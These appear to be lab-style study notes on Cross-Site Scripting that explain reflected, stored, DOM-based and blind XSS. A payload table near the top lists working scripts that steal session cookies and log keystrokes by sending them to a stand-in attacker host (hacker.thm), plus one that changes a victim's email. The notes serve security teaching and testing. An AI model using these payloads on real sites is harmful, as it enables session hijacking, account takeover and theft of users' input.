# Cross-Site Scripting (XSS)
Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.

## XSS Payloads 
| Category            | Proof of Concept |
|---------------------|------------------|
| XSS (Basic)         | `<script>alert('XSS');</script>` |
| Session Stealing    | `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>` |
| Key Logger          | `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key)); }</script>` |
| Business Logic      | `<script>user.changeEmail('attacker@hacker.thm');</script>` |

# Reflected XSS
Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

## Impact 
The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.

# Stored XSS
As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

## How to test for Stored XSS:
You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:
* Comments on a blog
* User profile information
* Website Listings

# DOM Based XSS
DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. 
DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.

# Blind XSS
Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.
